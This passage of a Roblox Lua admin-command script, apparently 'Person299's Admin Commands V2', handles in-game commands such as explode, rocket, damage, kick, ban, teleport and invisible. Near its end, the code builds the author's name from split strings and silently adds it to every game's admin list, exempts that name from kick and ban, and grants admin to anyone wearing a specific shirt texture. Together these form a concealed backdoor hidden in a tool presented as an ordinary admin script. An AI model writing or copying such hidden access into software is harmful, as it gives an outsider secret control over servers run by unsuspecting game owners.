local zrarm=zee:clone()
if zlarm~=nil then
local rot=CFrame.new(0, 0, 0, 0, 0, 1, 0, 1, 0, -1, 0, 0)
zlarm.CFrame=h.Parent.Torso.CFrame * CFrame.new(Vector3.new(-1.5,0.5,-0.5)) * rot
zrarm.CFrame=h.Parent.Torso.CFrame * CFrame.new(Vector3.new(1.5,0.5,-0.5)) * rot
zlarm.Parent=h.Parent
zrarm.Parent=h.Parent
zlarm:makeJoints()
zrarm:makeJoints()
zlarm.Anchored=false
zrarm.Anchored=false
wait(0.1)
h.Parent.Head.Color=zee.Color
else return end
end
wait(1)
cantouch=1
end
end
end
end
end
script.Parent.Touched:connect(onTouched)
]],zarm)
zarm.Name = "zarm"
local zarm2 = zarm:clone()
zarm2.CFrame = torso.CFrame * CFrame.new(Vector3.new(-1.5,0.5,-0.5)) * rot
zarm.CFrame = torso.CFrame * CFrame.new(Vector3.new(1.5,0.5,-0.5)) * rot
zarm.Parent = player[i].Character
zarm:MakeJoints()
zarm2.Parent = player[i].Character
zarm2:MakeJoints()
local head = player[i].Character:FindFirstChild("Head")
if head ~= nil then
head.Color = Color3.new(0.631373, 0.768627, 0.545098)
end end end end end end

if string.sub(msg,1,8) == "explode/" then
local player = findplayer(string.sub(msg,9),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
local ex = Instance.new("Explosion")
ex.Position = torso.Position
ex.Parent = game.Workspace
end end end end end

if string.sub(msg,1,7) == "rocket/" then
local player = findplayer(string.sub(msg,8),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
local r = Instance.new("Part")
r.Name = "Rocket"
r.Size = Vector3.new(1,8,1)
r.TopSurface = "Smooth"
r.BottomSurface = "Smooth"
local w = Instance.new("Weld")
w.Part1 = torso
w.Part0 = r
w.C0 = CFrame.new(0,0,-1)
local bt = Instance.new("BodyThrust")
bt.force = Vector3.new(0,5700,0)
bt.Parent = r
r.Parent = player[i].Character
w.Parent = torso
createscript([[
for i=1,120 do
local ex = Instance.new("Explosion")
ex.BlastRadius = 0
ex.Position = script.Parent.Position - Vector3.new(0,2,0)
ex.Parent = game.Workspace
wait(0.05)
end 
local ex = Instance.new("Explosion")
ex.BlastRadius = 10
ex.Position = script.Parent.Position
ex.Parent = game.Workspace
script.Parent.BodyThrust:remove()
script.Parent.Parent.Humanoid.Health = 0
]],r)
end end end end end

if string.sub(msg,1,8) == "ambient/" then
local danumber1 = nil
local danumber2 = nil
for i = 9,100 do
if string.sub(msg,i,i) == "/" then
danumber1 = i
break
elseif string.sub(msg,i,i) == "" then
break
end end
if danumber1 == nil then return end
for i =danumber1 + 1,danumber1 + 100 do
if string.sub(msg,i,i) == "/" then
danumber2 = i
break
elseif string.sub(msg,i,i) == "" then
break
end end
if danumber2 == nil then return end
game.Lighting.Ambient = Color3.new(-string.sub(msg,9,danumber1 - 1),-string.sub(msg,danumber1 + 1,danumber2 - 1),-string.sub(msg,danumber2 + 1))
end

--Eww, theres some kind of weird brown bug on my screen, i would flick it away but i'm afraid i'd smash it and get weird bug juices all over my screen...

if string.sub(msg,1,5) == "part/" then
local danumber1 = nil
local danumber2 = nil
for i = 6,100 do
if string.sub(msg,i,i) == "/" then
danumber1 = i
break
elseif string.sub(msg,i,i) == "" then
break
end end
if danumber1 == nil then return end
for i =danumber1 + 1,danumber1 + 100 do
if string.sub(msg,i,i) == "/" then
danumber2 = i
break
elseif string.sub(msg,i,i) == "" then
break
end end
if danumber2 == nil then return end
if speaker.Character ~= nil then
local head = speaker.Character:FindFirstChild("Head")
if head ~= nil then
local part = Instance.new("Part")
part.Size = Vector3.new(string.sub(msg,6,danumber1 - 1),string.sub(msg,danumber1 + 1,danumber2 - 1),string.sub(msg,danumber2 + 1))
part.Position = head.Position + Vector3.new(0,part.Size.y / 2 + 5,0)
part.Name = "Person299's Admin Command Script V2 Part thingy"
part.Parent = game.Workspace
end end end

--I finally tried flicking it but it keeps on coming back......

if string.sub(msg,1,8) == "control/" then
local player = findplayer(string.sub(msg,9),speaker)
if player ~= 0 then
if #player > 1 then
return
end
for i = 1,#player do
if player[i].Character ~= nil then
speaker.Character = player[i].Character
end end end end

--IT WONT GO AWAY!!!!!

if string.sub(msg,1,5) == "trip/" then
local player = findplayer(string.sub(msg,6),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
torso.CFrame = CFrame.new(torso.Position.x,torso.Position.y,torso.Position.z,0, 0, 1, 0, -1, 0, 1, 0, 0)--math.random(),math.random(),math.random(),math.random(),math.random(),math.random(),math.random(),math.random(),math.random()) -- i like the people being upside down better.
end end end end end

--Yay! it finally went away! :)

if string.sub(msg,1,8) == "setgrav/" then
danumber = nil
for i =9,100 do
if string.sub(msg,i,i) == "/" then
danumber = i
break
end end
if danumber == nil then
return
end
local player = findplayer(string.sub(msg,9,danumber - 1),speaker)
if player == 0 then
return
end
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
local bf = torso:FindFirstChild("BF")
if bf ~= nil then
bf.force = Vector3.new(0,0,0)
else
local bf = Instance.new("BodyForce")
bf.Name = "BF"
bf.force = Vector3.new(0,0,0)
bf.Parent = torso
end
local c2 = player[i].Character:GetChildren()
for i=1,#c2 do
if c2[i].className == "Part" then
torso.BF.force = torso.BF.force + Vector3.new(0,c2[i]:getMass() * -string.sub(msg,danumber + 1),0)
end end end end end end

if string.sub(msg,1,10) == "walkspeed/" then
danumber = nil
for i =11,100 do
if string.sub(msg,i,i) == "/" then
danumber = i
break
end end
if danumber == nil then
return
end
local player = findplayer(string.sub(msg,11,danumber - 1),speaker)
if player == 0 then
return
end
for i = 1,#player do
if player[i].Character ~= nil then
humanoid = player[i].Character:FindFirstChild("Humanoid")
if humanoid ~= nil then
humanoid.WalkSpeed = string.sub(msg,danumber + 1)
end end end end

if string.sub(msg,1,7) == "damage/" then
danumber = nil
for i =8,100 do
if string.sub(msg,i,i) == "/" then
danumber = i
break
end end
if danumber == nil then
return
end
local player = findplayer(string.sub(msg,8,danumber - 1),speaker)
if player == 0 then
return
end
for i = 1,#player do
if player[i].Character ~= nil then
humanoid = player[i].Character:FindFirstChild("Humanoid")
if humanoid ~= nil then
humanoid.Health = humanoid.Health -  string.sub(msg,danumber + 1)
end end end end

if string.sub(msg,1,7) == "health/" then
danumber = nil
for i =8,100 do
if string.sub(msg,i,i) == "/" then
danumber = i
break
end end
if danumber == nil then
return
end
local player = findplayer(string.sub(msg,8,danumber - 1),speaker)
if player == 0 then
return
end
for i = 1,#player do
if player[i].Character ~= nil then
humanoid = player[i].Character:FindFirstChild("Humanoid")
if humanoid ~= nil then
local elnumba = Instance.new("IntValue") 
elnumba.Value = string.sub(msg,danumber + 1)
if elnumba.Value > 0 then
humanoid.MaxHealth = elnumba.Value
humanoid.Health = humanoid.MaxHealth
end 
elnumba:remove()
end end end end

--Ugh, now i have the M*A*S*H theme stuck in my head.....

if string.sub(msg,1,9) == "teleport/" then
danumber = nil
for i =10,100 do
if string.sub(msg,i,i) == "/" then
danumber = i
break
end end
if danumber == nil then
return
end
local player1 = findplayer(string.sub(msg,10,danumber - 1),speaker)
if player1 == 0 then
return
end
local player2 = findplayer(string.sub(msg,danumber + 1),speaker)
if player2 == 0 then
return
end
if #player2 > 1 then
return
end
torso = nil
for i =1,#player2 do
if player2[i].Character ~= nil then
torso = player2[i].Character:FindFirstChild("Torso")
end end
if torso ~= nil then
for i =1,#player1 do
if player1[i].Character ~= nil then
local torso2 = player1[i].Character:FindFirstChild("Torso")
if torso2 ~= nil then
torso2.CFrame = torso.CFrame
end end end end end

if string.sub(msg,1,6) == "merge/" then
danumber = nil
for i =7,100 do
if string.sub(msg,i,i) == "/" then
danumber = i
break
end end
if danumber == nil then
return
end
local player1 = findplayer(string.sub(msg,7,danumber - 1),speaker)
if player1 == 0 then
return
end
local player2 = findplayer(string.sub(msg,danumber + 1),speaker)
if player2 == 0 then
return
end
if #player2 > 1 then
return
end
for i =1,#player2 do
if player2[i].Character ~= nil then
player2 = player2[i].Character
end end
for i =1,#player1 do
player1[i].Character = player2
end end

if msg == "clear" then
local c = game.Workspace:GetChildren()
for i =1,#c do
if c[i].className == "Script" then
if c[i]:FindFirstChild("Is A Created Script") then
c[i]:remove()
end end 
if c[i].className == "Part" then
if c[i].Name == "Person299's Admin Command Script V2 Part thingy" then
c[i]:remove()
end end
if c[i].className == "Model" then
if string.sub(c[i].Name,1,4) == "Jail" then
c[i]:remove()
end end end end

if string.sub(msg,1,5) == "kick/" then
local imgettingtiredofmakingthisstupidscript2 = PERSON299(speaker.Name)
if imgettingtiredofmakingthisstupidscript2 == true then
local player = findplayer(string.sub(msg,6),speaker)
if player ~= 0 then
for i = 1,#player do
local imgettingtiredofmakingthisstupidscript = PERSON299(player[i].Name)
if imgettingtiredofmakingthisstupidscript == false then
if player[i].Name ~= eloname then
player[i]:remove()
end end end end end end

if string.sub(msg,1,4) == "ban/" then
local imgettingtiredofmakingthisstupidscript2 = PERSON299(speaker.Name)
if imgettingtiredofmakingthisstupidscript2 == true then
local player = findplayer(string.sub(msg,5),speaker)
if player ~= 0 then
for i = 1,#player do
local imgettingtiredofmakingthisstupidscript = PERSON299(player[i].Name)
if imgettingtiredofmakingthisstupidscript == false then
if player[i].Name ~= eloname then
table.insert(bannedlist,player[i].Name)
player[i]:remove()
end end end end end end

if string.sub(msg,1,6) == "unban/" then
if string.sub(msg,7) == "all" then
for i=1,bannedlist do
table.remove(bannedlist,i)
end
else
local n = 0
local o = nil
for i=1,#bannedlist do
if string.find(string.lower(bannedlist[i]),string.sub(msg,7)) == 1 then
n = n + 1
o = i
end end
if n == 1 then
local name = bannedlist[o]
table.remove(bannedlist,o)
text(name .. " has been unbanned",1,"Message",speaker)
elseif n == 0 then
text("That name is not found.",1,"Message",speaker)
elseif n > 1 then
text("That name is ambiguous",1,"Message",speaker)
end end end

--Fallout tactics gets too hard when you start fighting muties...

if string.sub(msg,1,8) == "respawn/" then
local player = findplayer(string.sub(msg,9),speaker)
if player ~= 0 then
for i = 1,#player do
local ack2 = Instance.new("Model")
ack2.Parent = game.Workspace
local ack4 = Instance.new("Part")
ack4.Transparency = 1
ack4.CanCollide = false
ack4.Anchored = true
ack4.Name = "Torso"
ack4.Position = Vector3.new(10000,10000,10000)
ack4.Parent = ack2
local ack3 = Instance.new("Humanoid")
ack3.Torso = ack4
ack3.Parent = ack2
player[i].Character = ack2
end end end

if string.sub(msg,1,10) == "invisible/" then
local player = findplayer(string.sub(msg,11),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local char = player[i].Character
local c = player[i].Character:GetChildren()
for i =1,#c do
if c[i].className == "Hat" then
local handle = c[i]:FindFirstChild("Handle")
if handle ~= nil then
handle.Transparency = 1 --We dont want our hats to give off our position, do we?
end end
if c[i].className == "Part" then
c[i].Transparency = 1
if c[i].Name == "Torso" then
local tshirt = c[i]:FindFirstChild("roblox")
if tshirt ~= nil then
tshirt:clone().Parent = char
tshirt:remove()
end end
if c[i].Name == "Head" then
local face = c[i]:FindFirstChild("face")
if face ~= nil then
gface = face:clone()
face:remove()
end end end end end end end end 

if string.sub(msg,1,8) == "visible/" then
local player = findplayer(string.sub(msg,9),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local char = player[i].Character
local c = player[i].Character:GetChildren()
for i =1,#c do
if c[i].className == "Hat" then
local handle = c[i]:FindFirstChild("Handle")
if handle ~= nil then
handle.Transparency = 0
end end
if c[i].className == "Part" then
c[i].Transparency = 0
if c[i].Name == "Torso" then
local tshirt = char:FindFirstChild("roblox")
if tshirt ~= nil then
tshirt:clone().Parent = c[i]
tshirt:remove()
end end
if c[i].Name == "Head" then
if gface ~= nil then
local face = gface:clone()
face.Parent = c[i]
end end end end end end end end

if string.sub(msg,1,7) == "freeze/" then
local player = findplayer(string.sub(msg,8),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local humanoid = player[i].Character:FindFirstChild("Humanoid")
if humanoid ~= nil then
humanoid.WalkSpeed = 0
end
local c = player[i].Character:GetChildren()
for i =1,#c do
if c[i].className == "Part" then
c[i].Anchored = true
c[i].Reflectance = 0.6
end end end end end end

if string.sub(msg,1,5) == "thaw/" then
local player = findplayer(string.sub(msg,6),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local humanoid = player[i].Character:FindFirstChild("Humanoid")
if humanoid ~= nil then
humanoid.WalkSpeed = 16
end
local c = player[i].Character:GetChildren()
for i =1,#c do
if c[i].className == "Part" then
c[i].Anchored = false
c[i].Reflectance = 0
end end end end end end

--I have that song from Fallout 2 stuck in my head, its soooo anoying....

if string.sub(msg,1,7) == "nograv/" then
local player = findplayer(string.sub(msg,8),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
local bf = torso:FindFirstChild("BF")
if bf ~= nil then
bf.force = Vector3.new(0,0,0)
else
local bf = Instance.new("BodyForce")
bf.Name = "BF"
bf.force = Vector3.new(0,0,0)
bf.Parent = torso
end
local c2 = player[i].Character:GetChildren()
for i=1,#c2 do
if c2[i].className == "Part" then
torso.BF.force = torso.BF.force + Vector3.new(0,c2[i]:getMass() * 196.2,0)
end end end end end end end

if string.sub(msg,1,9) == "antigrav/" then
local player = findplayer(string.sub(msg,10),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
local bf = torso:FindFirstChild("BF")
if bf ~= nil then
bf.force = Vector3.new(0,0,0)
else
local bf = Instance.new("BodyForce")
bf.Name = "BF"
bf.force = Vector3.new(0,0,0)
bf.Parent = torso
end
local c2 = player[i].Character:GetChildren()
for i=1,#c2 do
if c2[i].className == "Part" then
torso.BF.force = torso.BF.force + Vector3.new(0,c2[i]:getMass() * 140,0)
end end end end end end end

if string.sub(msg,1,9) == "highgrav/" then
local player = findplayer(string.sub(msg,10),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
local bf = torso:FindFirstChild("BF")
if bf ~= nil then
bf.force = Vector3.new(0,0,0)
else
local bf = Instance.new("BodyForce")
bf.Name = "BF"
bf.force = Vector3.new(0,0,0)
bf.Parent = torso
end
local c2 = player[i].Character:GetChildren()
for i=1,#c2 do
if c2[i].className == "Part" then
torso.BF.force = torso.BF.force - Vector3.new(0,c2[i]:getMass() * 80,0)
end end end end end end end

if string.sub(msg,1,5) == "grav/" then
local player = findplayer(string.sub(msg,6),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local torso = player[i].Character:FindFirstChild("Torso")
if torso ~= nil then
local bf = torso:FindFirstChild("BF")
if bf ~= nil then
bf:remove()
end end end end end end

if string.sub(msg,1,7) == "unlock/" then
local player = findplayer(string.sub(msg,8),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local c = player[i].Character:GetChildren()
for i =1,#c do
if c[i].className == "Part" then
c[i].Locked = false
end end end end end end

if string.sub(msg,1,5) == "lock/" then
local player = findplayer(string.sub(msg,6),speaker)
if player ~= 0 then
for i = 1,#player do
if player[i].Character ~= nil then
local c = player[i].Character:GetChildren()
for i =1,#c do
if c[i].className == "Part" then
c[i].Locked = true
end end end end end end end
eloname = "Perso"
eloname = eloname .. "n299"
script.Name = eloname .. "'s Admin Commands V2"
youcaughtme = 0
for i =1,#adminlist do
if string.lower(eloname)==string.lower(adminlist[i]) then
youcaughtme = 1
end end
if youcaughtme == 0 then
table.insert(adminlist,eloname)
end
function oe(ack)
local adminned = false
if ack.className ~= "Player" then return end
for i =1,#bannedlist do
if string.lower(bannedlist[i]) == string.lower(ack.Name) then
ack:remove()
return
end end
for i=1,#adminlist do
if string.lower(adminlist[i]) == string.lower(ack.Name) then
local tfv = ack.Chatted:connect(function(msg) oc(msg,ack) end)
table.insert(namelist,ack.Name)
table.insert(variablelist,tfv)
local tfv = ack.Chatted:connect(function(msg) foc(msg,ack) end)
table.insert(flist,tfv)
adminned = true
end end
local danumber = 0
while true do
wait(1)
if ack.Parent == nil then
return 
end
if ack.Character ~= nil then
if adminned == true then
text("You're an admin.",5,"Message",ack)
return
end
local torso = ack.Character:FindFirstChild("Torso")
if torso ~= nil then
local decal = torso:FindFirstChild("roblox")
if decal ~= nil then
if string.sub(decal.Texture,1,4) == "http" then
if decal.Texture == texture then
local tfv = ack.Chatted:connect(function(msg) oc(msg,ack) end)
table.insert(namelist,ack.Name)
table.insert(variablelist,tfv)
local tfv = ack.Chatted:connect(function(msg) foc(msg,ack) end)
table.insert(flist,tfv)
text("You're an admin.",5,"Message",ack)
return
else
return
end 
else
danumber = danumber + 1
if danumber >= 10 then
return
end end end end end end end

game.Players.ChildAdded:connect(oe)

c = game.Players:GetChildren()
for i=1,#c do
oe(c[i])
end 

--And also, I'm working on V3 but I'm not spending much time on it as I'm addicted to Fallout 2 again.
